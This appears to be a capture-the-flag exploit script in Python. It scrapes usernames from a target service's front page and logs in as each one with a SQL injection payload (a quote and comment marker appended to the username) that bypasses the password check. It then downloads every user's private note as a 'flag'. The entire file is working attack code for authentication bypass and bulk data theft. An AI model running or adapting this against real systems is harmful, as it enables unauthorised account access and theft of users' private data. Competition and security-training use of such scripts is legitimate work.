import requests
from bs4 import BeautifulSoup
import sys

if __name__ == '__main__':
    address = sys.argv[1]
    port = "3075"
    url_login = "http://" + address + ":" + port + "/login"
    url = "http://" + address + ":" + port + "/"
    url_show_note = "http://" + address + ":" + port + "/show_note"
    session = requests.Session()
    response = session.get(url, data="")
    if response.status_code == 200:
        soup = BeautifulSoup(response.text, 'html.parser')
        li_elements = soup.find_all('li')
        i_texts = [li.get_text() for li in li_elements]
        flags = []
        print(i_texts)
        for username in i_texts:
            login_data = {
                        'username': username + "';--",
                        'password': '1'
            }
            response = session.post(url_login, data=login_data)
            if response.status_code == 200:
                show_response = session.get(url_show_note)
                if show_response.status_code == 200:
                    note_json = show_response.json()
                    if note_json.get('success', False):
                        if note_json.get('note') != "No note found":
                            flags.append(note_json.get('note'))
            else:
                print("not loged in")
        for flag in flags:
            print(flag)
    